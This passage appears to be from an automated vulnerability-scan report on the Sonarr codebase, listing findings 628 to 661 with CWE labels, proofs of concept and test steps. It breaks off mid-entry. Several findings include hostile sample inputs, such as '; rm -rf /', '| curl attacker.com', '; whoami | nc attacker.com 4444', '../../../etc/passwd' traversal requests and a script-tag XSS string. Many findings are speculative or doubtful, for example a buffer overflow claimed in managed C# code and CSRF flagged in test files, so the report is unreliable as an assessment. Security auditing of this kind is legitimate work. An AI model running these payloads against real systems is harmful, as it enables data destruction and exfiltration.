**File:** src/NzbDrone.Core/Notifications/Notifiarr/NotifiarrProxy.cs
**Line:** 40

**Description:**
Notifiarr notification system may be vulnerable to CSRF attacks due to lack of CSRF protection in API interactions.

**Evidence:**
```
The NotifiarrProxy sends notifications via HTTP POST requests but doesn't implement CSRF token validation or protection mechanisms.
```

**Impact:**
An attacker could potentially send notifications to Notifiarr on behalf of authenticated users, potentially causing unauthorized notifications or data exposure.

**Proof of Concept:**
If an attacker can make a request to Sonarr's notification endpoint that triggers a Notifiarr notification, they could potentially send unauthorized notifications to Notifiarr.

**How to Test:**
1. Configure Notifiarr notification
2. Monitor for CSRF protection in API endpoints
3. Test if notifications can be triggered without proper authentication
4. Verify CSRF token implementation in notification endpoints

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Notifications_Notifiarr_NotifiarrProxycs.py`
---

### 628. Improper Neutralization of Special Elements (CWE-707)

**File:** src/NzbDrone.Core/Notifications/Signal/SignalPayload.cs
**Line:** 10

**Description:**
Signal notification payload doesn't properly neutralize special elements in message content, potentially allowing injection attacks.

**Evidence:**
```
The SignalPayload class directly uses message content without proper sanitization or escaping of special characters.
```

**Impact:**
Malicious message content could be interpreted as special elements in Signal notifications, potentially allowing injection attacks or data manipulation.

**Proof of Concept:**
If a user can control message content sent to Signal notifications, they could inject special characters that might be interpreted differently by Signal's processing system.

**How to Test:**
1. Configure Signal notification
2. Send notification with special characters in message content
3. Observe how Signal processes these special characters
4. Test with various injection payloads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Notifications_Signal_SignalPayloadcs.py`
---

### 629. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Validation/Paths/RootFolderExistsValidator.cs
**Line:** 25

**Description:**
The RootFolderExistsValidator uses string comparison operations that could be vulnerable to command injection if path values are not properly sanitized before being used in system calls.

**Evidence:**
```
The validator uses context.PropertyValue.ToString() without sanitizing for command injection vulnerabilities, and the path validation relies on string operations that could be exploited if paths contain malicious commands.
```

**Impact:**
An attacker could potentially inject commands through path values when the system validates root folder existence, leading to arbitrary command execution.

**Proof of Concept:**
If a path contains shell metacharacters like '; rm -rf /' or '| curl attacker.com', and the system uses these paths in shell commands, an attacker could execute arbitrary commands.

**How to Test:**
1. Create a root folder path with shell metacharacters
2. Try to add this path to Sonarr
3. Monitor if any shell commands are executed with the path values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Validation_Paths_RootFolderExistsValidatorcs.py`
---

### 630. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Validation/RuleBuilderExtensions.cs
**Line:** 32

**Description:**
The ValidPort validator allows ports 1-1024 but only permits 80 and 443 for ports under 1024, which could be confusing and potentially insecure.

**Evidence:**
```
The ValidPort method has special handling for ports under 1024, allowing only 80 and 443, but this validation is not consistent with standard port security practices.
```

**Impact:**
Inconsistent port validation could lead to unexpected behavior or security gaps in port configuration, potentially allowing insecure port assignments.

**Proof of Concept:**
A user could configure a port like 22 (SSH) or 21 (FTP) in the 1-1024 range, which would be rejected by the validator, but the system might not properly validate other port ranges.

**How to Test:**
1. Try to configure a port like 22 or 21 in the settings
2. Verify if these ports are rejected by the validation
3. Check if the system properly validates all port ranges

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Validation_RuleBuilderExtensionscs.py`
---

### 631. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Validation/NzbDroneValidationExtensions.cs
**Line:** 12

**Description:**
The Filter method in NzbDroneValidationExtensions uses Contains() method on a collection that could be vulnerable to array index issues if the fields parameter is not properly validated.

**Evidence:**
```
The Filter method uses fields.Contains(v.PropertyName) without validating that fields is properly initialized or that the array bounds are correct.
```

**Impact:**
If the fields array contains invalid indices or is not properly validated, it could lead to array index out of bounds exceptions or incorrect filtering behavior.

**Proof of Concept:**
Pass an array with invalid indices or null values to the Filter method and observe if it properly handles the validation or throws exceptions.

**How to Test:**
1. Call Filter method with null or invalid field arrays
2. Verify if the method properly handles edge cases
3. Check for potential array index out of bounds exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Validation_NzbDroneValidationExtensionscs.py`
---

### 632. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Localization/LocalizationService.cs
**Line:** 105

**Description:**
The LocalizationService handles configuration changes but doesn't appear to implement CSRF protection for configuration updates, which could allow CSRF attacks on localization settings.

**Evidence:**
```
The LocalizationService handles ConfigSavedEvent but doesn't show any CSRF token validation in the configuration update flows, and the service is used for UI localization which is typically exposed through web endpoints.
```

**Impact:**
An attacker could craft a CSRF attack to modify localization settings or trigger configuration changes that affect the application's behavior.

**Proof of Concept:**
Create a malicious web page that submits configuration changes to Sonarr's localization settings using the current user's session, potentially changing language settings or triggering unwanted behavior.

**How to Test:**
1. Monitor for CSRF protection in configuration update endpoints
2. Test if configuration changes can be submitted without proper authentication tokens
3. Verify if localization settings are vulnerable to CSRF attacks

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Localization_LocalizationServicecs.py`
---

### 633. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Validation/Paths/RootFolderExistsValidator.cs
**Line:** 25

**Description:**
The path validation logic in RootFolderExistsValidator could be vulnerable to command injection if paths are used in shell commands without proper neutralization.

**Evidence:**
```
The validator uses path values directly in string comparisons and path operations without neutralizing special shell characters that could be used for command injection.
```

**Impact:**
If the system later uses these validated paths in shell commands, an attacker could inject commands through specially crafted paths.

**Proof of Concept:**
Create a path with shell metacharacters like '; whoami | nc attacker.com 4444' and verify if this path could be used in shell commands without proper sanitization.

**How to Test:**
1. Create paths with shell metacharacters
2. Try to use these paths in system commands
3. Check if special characters are properly escaped or sanitized

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Validation_Paths_RootFolderExistsValidatorcs.py`
---

### 634. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/Validation/FolderValidator.cs
**Line:** 12

**Description:**
The FolderValidator uses path values in log messages without proper neutralization, potentially leading to log injection vulnerabilities.

**Evidence:**
```
The GetDefaultMessageTemplate() method returns a template with '{path}' placeholder, and the IsValid method uses context.PropertyValue.ToString() in log messages without neutralizing special characters.
```

**Impact:**
An attacker could inject log entries with special characters that could be interpreted by log parsers or cause issues in log analysis tools.

**Proof of Concept:**
Use a path containing log injection characters like '\n' or '\r' and observe if these characters are properly handled in log output.

**How to Test:**
1. Use paths with special characters in folder validation
2. Check if log messages properly escape special characters
3. Verify if log injection is possible through path values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_Validation_FolderValidatorcs.py`
---

### 635. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Validation/Paths/PathValidator.cs
**Line:** 18

**Description:**
The PathValidator uses IsPathValid() method which might not properly validate against path traversal attacks, especially when dealing with relative paths.

**Evidence:**
```
The validator uses IsPathValid(PathValidationType.CurrentOs) without explicit path traversal checks, and the method doesn't validate against '..' or './' path components.
```

**Impact:**
An attacker could potentially use path traversal sequences to access files outside of intended directories, leading to information disclosure or unauthorized file access.

**Proof of Concept:**
Try to use paths with '../' or './' sequences and verify if they are properly validated against path traversal attacks.

**How to Test:**
1. Test paths with '../' sequences
2. Verify if path traversal is properly prevented
3. Check if the system allows access to parent directories

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Validation_Paths_PathValidatorcs.py`
---

### 636. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Validation/Paths/PathValidator.cs
**Line:** 18

**Description:**
The PathValidator uses string formatting with external values that could be vulnerable to format string injection attacks.

**Evidence:**
```
The validator uses context.PropertyValue.ToString() in message formatting without proper validation of format string parameters.
```

**Impact:**
If the path values contain format specifiers, they could be used to inject additional format parameters or cause unexpected behavior in logging or error messages.

**Proof of Concept:**
Use a path containing format specifiers like '%s' or '%n' and observe if these are properly handled in error messages or logs.

**How to Test:**
1. Create paths with format specifiers
2. Verify if these specifiers are properly escaped or handled
3. Check for potential format string injection vulnerabilities

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Validation_Paths_PathValidatorcs.py`
---

### 637. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Mono.Test/DiskProviderTests/DiskProviderFixture.cs
**Line:** 120

**Description:**
The SetPermissions method accepts permission strings without proper validation, potentially allowing invalid or dangerous permission values.

**Evidence:**
```
In the SetPermissions tests, permission strings like '755', '0755', '1775' are used without validating their format or range. The method Subject.SetPermissions(tempFile, "1775", null) is called without checking if the input is valid.
```

**Impact:**
Invalid permission strings could cause permission setting failures or unexpected behavior in file access control.

**Proof of Concept:**
If a malformed permission string like '9999' or 'abc' were passed to SetPermissions, it could result in incorrect permission settings or exceptions that aren't properly handled.

**How to Test:**
1. Test SetPermissions with invalid permission strings like '9999', 'abc', or '12345'
2. Verify that the method properly validates input format
3. Check that invalid inputs either throw exceptions or are handled gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneMonoTest_DiskProviderTests_DiskProviderFixturecs.py`
---

### 638. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Host.Test/NzbDroneProcessServiceFixture.cs
**Line:** 20

**Description:**
The test code doesn't validate CSRF protection mechanisms, which could indicate missing CSRF implementation in the actual application.

**Evidence:**
```
The test class NzbDroneProcessServiceFixture tests process management but doesn't include any CSRF-related tests or validation, suggesting the main application might be missing CSRF protection.
```

**Impact:**
If the actual application lacks CSRF protection, it could be vulnerable to CSRF attacks that modify application state or perform unauthorized actions.

**Proof of Concept:**
An attacker could craft a malicious website that, when visited by an authenticated user, sends requests to the Sonarr application to perform actions like adding new downloads or changing settings without the user's knowledge.

**How to Test:**
1. Test application endpoints for CSRF tokens in forms and API calls
2. Verify that requests without proper CSRF tokens are rejected
3. Check that the application implements CSRF protection mechanisms

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneHostTest_NzbDroneProcessServiceFixturecs.py`
---

### 639. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Mono.Test/DiskProviderTests/DiskProviderFixture.cs
**Line:** 100

**Description:**
The test code uses GetTempFilePath() without validating that the generated paths are within expected boundaries, potentially exposing path traversal vulnerabilities.

**Evidence:**
```
The tests use GetTempFilePath() to generate temporary paths but don't validate that these paths are properly sandboxed or restricted, which could indicate similar issues in the production code.
```

**Impact:**
If the production code doesn't properly validate file paths, it could allow path traversal attacks that access files outside of intended directories.

**Proof of Concept:**
If the production code allows user input to influence file paths without proper validation, an attacker could use paths like '../config.xml' to access configuration files outside of the intended directory.

**How to Test:**
1. Test file operations with paths containing '..' components
2. Verify that path traversal attempts are properly rejected
3. Check that file operations are restricted to intended directories

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneMonoTest_DiskProviderTests_DiskProviderFixturecs.py`
---

### 640. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Mono.Test/DiskProviderTests/DiskProviderFixture.cs
**Line:** 150

**Description:**
The test code uses array indexing without proper bounds checking, which could indicate similar issues in production code.

**Evidence:**
```
In the IsValidFolderPermissionMask tests, the code uses array-like operations but doesn't show explicit bounds checking that would be needed in production code.
```

**Impact:**
Array index validation issues could lead to buffer overflows or access violations in production code.

**Proof of Concept:**
If production code uses array indexing without bounds checking and receives malformed input, it could access memory outside allocated bounds, potentially causing crashes or security vulnerabilities.

**How to Test:**
1. Test array access with out-of-bounds indices
2. Verify that array bounds are properly validated
3. Check for potential buffer overflow scenarios

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneMonoTest_DiskProviderTests_DiskProviderFixturecs.py`
---

### 641. Cross-Site Scripting (CWE-79)

**File:** src/NzbDrone.Host.Test/NzbDroneProcessServiceFixture.cs
**Line:** 1

**Description:**
The test code doesn't validate XSS protection in the application, which could indicate missing XSS protection in the actual application.

**Evidence:**
```
The test class doesn't include any tests for XSS protection, suggesting the main application might be missing proper input sanitization for web output.
```

**Impact:**
If the application doesn't sanitize user input in web responses, it could be vulnerable to XSS attacks that allow attackers to execute malicious scripts in users' browsers.

**Proof of Concept:**
An attacker could inject malicious JavaScript into application inputs (like download names, descriptions, or configuration values) that are then rendered in web pages without proper sanitization.

**How to Test:**
1. Test web application responses for proper input sanitization
2. Verify that user inputs are escaped when rendered in HTML
3. Check for XSS protection in API responses and web UI components

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneHostTest_NzbDroneProcessServiceFixturecs.py`
---

### 642. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The OpenAPI specification defines parameters without proper validation, potentially allowing malicious input to be processed by the API endpoints.

**Evidence:**
```
Several endpoints accept query parameters and path parameters without explicit validation rules. For example, the '/login' endpoint accepts 'returnUrl' query parameter without validation, and various endpoints accept string parameters that could be manipulated.
```

**Impact:**
Attackers could potentially inject malicious data through query parameters or path variables, leading to unexpected behavior or exploitation of downstream services.

**Proof of Concept:**
An attacker could make a request to '/login?returnUrl=../../../etc/passwd' which might be processed without proper validation, potentially leading to path traversal or information disclosure.

**How to Test:**
Test various API endpoints with malformed parameters, special characters, and long input values to see if the system properly validates inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV5_openapijson.py`
---

### 643. Cross-Site Request Forgery (CWE-352)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification lacks explicit CSRF protection mechanisms for state-changing operations.

**Evidence:**
```
The OpenAPI spec defines many POST, PUT, and DELETE operations but doesn't include CSRF token handling in the authentication flow or request structure. The login endpoint accepts username/password but doesn't require CSRF tokens for subsequent authenticated operations.
```

**Impact:**
Authenticated users could be vulnerable to CSRF attacks where malicious sites could perform actions on their behalf without their knowledge.

**Proof of Concept:**
An attacker could create a malicious webpage that automatically submits a POST request to '/api/v5/episode/{id}' to modify episode data without the user's consent, assuming the user is authenticated.

**How to Test:**
Test if API endpoints require CSRF tokens for state-changing operations. Check if authentication tokens are sufficient or if additional protection is needed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrApiV5_openapijson.py`
---

### 644. Cross-Site Scripting (CWE-79)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define proper output sanitization for potentially user-controllable data.

**Evidence:**
```
Many endpoints return user-provided data (series names, episode titles, etc.) without specifying output encoding or sanitization. The schema definitions reference various resource objects that may contain user-controllable data.
```

**Impact:**
If the API responses are consumed by web applications that don't properly escape output, XSS vulnerabilities could be introduced in the frontend.

**Proof of Concept:**
If a series title contains '<script>alert(1)</script>' and this is returned in an API response that gets embedded in a web page without proper escaping, it could lead to XSS.

**How to Test:**
Test API responses for proper output encoding. Check if user-controllable data in API responses is properly escaped when rendered in web applications.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV5_openapijson.py`
---

### 645. Path Traversal (CWE-22)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification allows path parameters that could be vulnerable to directory traversal attacks.

**Evidence:**
```
The '/api/v5/log/file/{filename}' endpoint accepts a filename parameter with a regex pattern '[-.a-zA-Z0-9]+?\.txt' but doesn't validate against directory traversal sequences like '../' or '..\'. The path parameter handling could allow traversal attacks.
```

**Impact:**
Attackers could potentially access files outside the intended directory by manipulating path parameters.

**Proof of Concept:**
A request to '/api/v5/log/file/../../../etc/passwd' could potentially allow access to system files if the API doesn't properly validate the filename parameter.

**How to Test:**
Test path parameters with directory traversal sequences like '../', '..\', and combinations. Verify that the API properly sanitizes path inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV5_openapijson.py`
---

### 646. Improper Control of Dynamically-Generated Code Resources (CWE-913)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification allows dynamic parameter handling that could lead to code execution vulnerabilities.

**Evidence:**
```
The API uses various dynamic parameters and schema references that could be manipulated. The specification doesn't enforce strict validation of parameter types or values, potentially allowing injection of unexpected data types.
```

**Impact:**
If the backend implementation doesn't properly validate dynamic parameters, it could lead to code injection or unexpected behavior.

**Proof of Concept:**
If a parameter that expects an integer is provided with a string value that gets processed as code, it could lead to unexpected behavior or injection vulnerabilities.

**How to Test:**
Test API endpoints with unexpected data types in parameters. Verify that the backend properly validates and sanitizes all dynamic inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_SonarrApiV5_openapijson.py`
---

### 647. Insecure Data Storage (CWE-312)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define secure handling of sensitive data, particularly in authentication flows.

**Evidence:**
```
The login endpoint accepts username and password in the request body but doesn't specify secure transmission requirements or password handling practices. The API doesn't define secure storage requirements for sensitive data.
```

**Impact:**
Sensitive authentication data could be exposed in transit or at rest if not properly handled by the implementation.

**Proof of Concept:**
If the API doesn't enforce HTTPS for authentication endpoints or doesn't properly handle password hashing, credentials could be compromised.

**How to Test:**
Verify that authentication endpoints require HTTPS and that sensitive data is properly handled. Test for secure transmission of credentials.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrApiV5_openapijson.py`
---

### 648. Improper Access Control (CWE-284)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define explicit access control mechanisms for different endpoints, potentially allowing unauthorized access.

**Evidence:**
```
Multiple endpoints are defined without indicating authentication or authorization requirements, making it unclear which operations require specific permissions.
```

**Impact:**
Unauthorized users might be able to access or modify data they shouldn't have access to, potentially leading to data breaches or system compromise.

**Proof of Concept:**
An unauthenticated user might be able to access '/api/v5/series/{id}' endpoint and retrieve series information that should be restricted.

**How to Test:**
Test API endpoints without authentication to see if they return sensitive data or allow modifications that should require authentication.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_SonarrApiV5_openapijson.py`
---

### 649. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define mechanisms for verifying the authenticity of data received from clients.

**Evidence:**
```
Several endpoints accept JSON payloads without indicating if data signatures or authentication tokens are required for validation.
```

**Impact:**
Malicious actors could submit forged data that might be accepted as legitimate, potentially leading to data corruption or unauthorized operations.

**Proof of Concept:**
An attacker could submit a forged series resource with modified 'tvdbId' or 'seasonNumber' values that would be accepted without verification.

**How to Test:**
Test API endpoints with modified payloads to see if they validate data authenticity or accept potentially forged inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_SonarrApiV5_openapijson.py`
---

### 650. Cross-site Scripting (XSS) (CWE-79)

**File:** src/Sonarr.Api.V5/Series/SeriesController.cs
**Line:** 120

**Description:**
The SeriesController's AllSeries method does not properly sanitize the Title field when returning SeriesResource objects, potentially allowing XSS attacks through user-provided series titles.

**Evidence:**
```
The SeriesResource.Title property is directly returned from the database without HTML encoding in the AllSeries method, and the ToResource method in SeriesResourceMapper doesn't apply any sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript into series titles which would execute when users view the series list or details, potentially stealing session cookies or performing unauthorized actions.

**Proof of Concept:**
1. Create a series with title '<script>alert("XSS")</script>'
2. Access the series list endpoint
3. The injected script tag will execute in the browser context

**How to Test:**
1. Send POST request to /api/v5/series with title containing script tags
2. Call GET /api/v5/series to retrieve the series list
3. Observe if script tags are executed in the browser

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV5_Series_SeriesControllercs.py`
---

### 651. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V5/Series/SeriesEditorController.cs
**Line:** 54

**Description:**
The SeriesEditorController SaveAll method accepts tags from the request body without proper validation, potentially allowing invalid tag IDs to be processed.

**Evidence:**
```
The ApplyTags enum is used directly from the request without validation, and the Tags list is processed without checking for valid tag IDs against the database.
```

**Impact:**
Invalid tag IDs could cause database errors or lead to inconsistent tag assignments, potentially affecting series tagging functionality.

**Proof of Concept:**
1. Send PUT request to /api/v5/series/editor with ApplyTags.Replace and invalid tag IDs (e.g., negative numbers)
2. The system processes these without validation
3. Could result in database constraint violations or unexpected behavior

**How to Test:**
1. Send PUT request to /api/v5/series/editor with invalid tag IDs
2. Check if system handles invalid IDs gracefully
3. Verify database consistency after processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV5_Series_SeriesEditorControllercs.py`
---

### 652. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/Sonarr.Api.V5/Series/SeriesEditorController.cs
**Line:** 77

**Description:**
The RootFolderPath from request body is directly used in file system operations without proper validation, potentially leading to command injection or path traversal.

**Evidence:**
```
The RootFolderPath is assigned directly to series.RootFolderPath and used in BulkMoveSeries operations without validation or sanitization.
```

**Impact:**
An attacker could manipulate the RootFolderPath to perform unauthorized file system operations or access files outside intended directories.

**Proof of Concept:**
1. Send PUT request to /api/v5/series/editor with RootFolderPath containing '../'
2. The system processes this path without validation
3. Could potentially move files to unintended locations or access parent directories

**How to Test:**
1. Send PUT request with RootFolderPath containing path traversal sequences
2. Verify if system allows access to parent directories
3. Check if file operations are performed on unexpected paths

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_SonarrApiV5_Series_SeriesEditorControllercs.py`
---

### 653. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V5/Series/SeriesController.cs
**Line:** 170

**Description:**
The GetResourceById method uses string parsing from query parameters without proper bounds checking, potentially leading to buffer overflows.

**Evidence:**
```
The method parses includeSubresources from query string without validating the number of elements or their values, which could lead to array overruns.
```

**Impact:**
An attacker could craft a request with an excessive number of includeSubresources to cause buffer overflow or memory corruption.

**Proof of Concept:**
1. Send GET request to /api/v5/series/{id} with many includeSubresources parameters
2. The system processes these without bounds checking
3. Could potentially cause memory corruption or application crash

**How to Test:**
1. Send GET request with excessive includeSubresources parameters
2. Monitor application for crashes or memory issues
3. Check if system handles large parameter sets gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV5_Series_SeriesControllercs.py`
---

### 654. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/Sonarr.Api.V5/Series/SeriesController.cs
**Line:** 270

**Description:**
The UpdateSeries method constructs file paths using user-provided Path values without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The Path property from SeriesResource is used directly in file operations without validation against allowed directories.
```

**Impact:**
An attacker could manipulate the Path field to move series files to unintended locations or access files outside the intended directory structure.

**Proof of Concept:**
1. Send PUT request to /api/v5/series/{id} with Path containing '../'
2. The system processes this path without validation
3. Could potentially move files to parent directories or access system files

**How to Test:**
1. Send PUT request with Path containing path traversal sequences
2. Verify if system allows access to parent directories
3. Check if file operations are performed on unexpected paths

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV5_Series_SeriesControllercs.py`
---

### 655. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/Sonarr.Api.V5/Settings/UiSettingsController.cs
**Line:** 25

**Description:**
The UI settings controller saves configuration values directly to the config file without encryption, potentially exposing sensitive information.

**Evidence:**
```
The SaveConfig method in UiSettingsController directly saves configuration values to the config file without any encryption or obfuscation.
```

**Impact:**
Sensitive configuration values stored in plain text could be accessed by unauthorized users with file system access.

**Proof of Concept:**
1. Access the Sonarr config file
2. Observe that sensitive settings are stored in cleartext
3. Check if any passwords or API keys are stored without encryption

**How to Test:**
1. Examine the config file after saving settings
2. Verify that sensitive values are stored in plain text
3. Check if any encryption is applied to sensitive fields

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrApiV5_Settings_UiSettingsControllercs.py`
---

### 656. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/Sonarr.Api.V5/Series/SeriesEditorController.cs
**Line:** 30

**Description:**
The SeriesEditorController lacks CSRF protection for its PUT and DELETE endpoints, making them vulnerable to cross-site request forgery attacks.

**Evidence:**
```
The controller methods are decorated with HttpPut and HttpDelete attributes but don't implement CSRF token validation.
```

**Impact:**
An attacker could trick authenticated users into performing unwanted actions on series (update, delete) without their knowledge.

**Proof of Concept:**
1. Create a malicious website with a form that targets the SeriesEditorController endpoints
2. When authenticated user visits the site, the form automatically submits requests
3. Series data gets modified without user consent

**How to Test:**
1. Create a test HTML page with forms targeting the API endpoints
2. Authenticate as a user
3. Visit the malicious page and observe if requests are automatically submitted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrApiV5_Series_SeriesEditorControllercs.py`
---

### 657. Uncontrolled Resource Consumption (CWE-400)

**File:** src/Sonarr.Api.V5/Series/SeriesController.cs
**Line:** 120

**Description:**
The AllSeries method can consume unbounded resources when processing large numbers of series, potentially leading to denial of service.

**Evidence:**
```
The method retrieves all series without pagination or limit, and processes them in memory without resource constraints.
```

**Impact:**
Large series collections could cause memory exhaustion or slow response times, leading to denial of service.

**Proof of Concept:**
1. Create a large number of series (1000+)
2. Call the AllSeries endpoint
3. Observe memory usage and response time

**How to Test:**
1. Create a large number of series
2. Call the AllSeries endpoint
3. Monitor memory usage and response time
4. Check for potential DoS conditions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-400_src_SonarrApiV5_Series_SeriesControllercs.py`
---

### 658. Deserialization of Untrusted Data (CWE-502)

**File:** src/Sonarr.Api.V5/CustomFilters/CustomFilterResource.cs
**Line:** 20

**Description:**
The CustomFilterResource uses ExpandoObject for filters which can be deserialized from untrusted input without proper validation.

**Evidence:**
```
The Filters property uses List<ExpandoObject> which can be populated from JSON without schema validation.
```

**Impact:**
Maliciously crafted filter data could cause deserialization errors or unexpected behavior in the custom filter system.

**Proof of Concept:**
1. Send POST request to /api/v5/customfilter with malicious ExpandoObject data
2. The system deserializes this without validation
3. Could potentially cause runtime errors or unexpected behavior

**How to Test:**
1. Send POST request with malformed ExpandoObject data
2. Verify if system handles malformed data gracefully
3. Check for potential deserialization errors

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrApiV5_CustomFilters_CustomFilterResourcecs.py`
---

### 659. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/Sonarr.Api.V5/EpisodeFiles/EpisodeFileController.cs
**Line:** 100

**Description:**
The DeleteEpisodeFiles method processes bulk operations without resource limits, potentially allowing resource exhaustion attacks.

**Evidence:**
```
The bulk delete operation processes all provided episode file IDs without checking the number of items or imposing limits.
```

**Impact:**
An attacker could submit a large number of episode file IDs to exhaust system resources or cause performance degradation.

**Proof of Concept:**
1. Send DELETE request to /api/v5/episodefile/bulk with 10000 episode file IDs
2. The system processes all without limits
3. Could cause memory exhaustion or slow processing

**How to Test:**
1. Send bulk delete request with large number of IDs
2. Monitor system resources during processing
3. Check for performance degradation or resource exhaustion

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_SonarrApiV5_EpisodeFiles_EpisodeFileControllercs.py`
---

### 660. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 67

**Description:**
The GetLogFileResponse method accepts a filename parameter that is not properly validated before being used in file operations, potentially leading to path traversal vulnerabilities.

**Evidence:**
```
The filename parameter is directly used in GetLogFilePath without validation: string filePath = GetLogFilePath(filename);
```

**Impact:**
An attacker could potentially read arbitrary files from the server by manipulating the filename parameter to include directory traversal sequences like '../'.

**Proof of Concept:**
An attacker could request: GET /api/v1/log/file/../../../etc/passwd HTTP/1.1 which would attempt to read the system password file instead of a log file.

**How to Test:**
Send requests with filenames containing '../' sequences to the GetLogFileResponse endpoint and verify if arbitrary file reads are possible.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 661. Cross-site Scripting (XSS) (CWE-79)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 54

**Description:**
